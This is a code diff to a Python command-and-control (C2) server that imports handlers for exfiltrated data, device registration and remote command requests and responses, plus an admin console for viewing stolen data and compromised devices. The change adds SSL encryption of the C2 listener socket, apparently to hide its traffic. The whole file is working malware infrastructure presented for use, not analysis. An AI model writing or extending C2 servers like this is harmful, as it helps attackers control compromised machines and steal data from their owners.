@@ -1,15 +1,13 @@
-import log_util
 import os
-import json
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import parse_qs, urlparse
-import threading
-
 from admin_console import WebAdminConsole
 from exfil_handler import handle_exfil_data, handle_analytics_data
 from command_handler import handle_device_registration, handle_command_request, handle_command_response
 from data_view import serve_data_listing, serve_command_results, serve_devices_listing
 from log_util import logger
+import ssl
+
 
 # Use the directory where the script is located for data storage
 SCRIPT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -117,21 +115,23 @@ class C2RequestHandler(BaseHTTPRequestHandler):
             self.end_headers()
 
 
-def run_c2_server(port, admin_port=8080):
-    """Run the C2 server with Firebase integration"""
+def run_c2_server(port, admin_port=8080, use_ssl=True, cert_path=None, key_path=None):
     # Create data directory if it doesn't exist
     os.makedirs(DATA_DIR, exist_ok=True)
 
-    # Create HTTPS server
     httpd = HTTPServer(('0.0.0.0', port), C2RequestHandler)
 
-    # Start admin console
+    if use_ssl and cert_path and key_path:
+        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+        ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
+        httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)
+        logger.info("SSL enabled with provided certificate")
+
     admin_console = WebAdminConsole(admin_port)
     admin_console.start()
 
     try:
-        # Run server
-        logger.info(f"C2 server running on port {port}")
+        logger.info(f"C2 server running on port {port} {'with' if use_ssl else 'without'} SSL")
         logger.info(f"Admin console running on port {admin_port}")
         httpd.serve_forever()
     except KeyboardInterrupt:
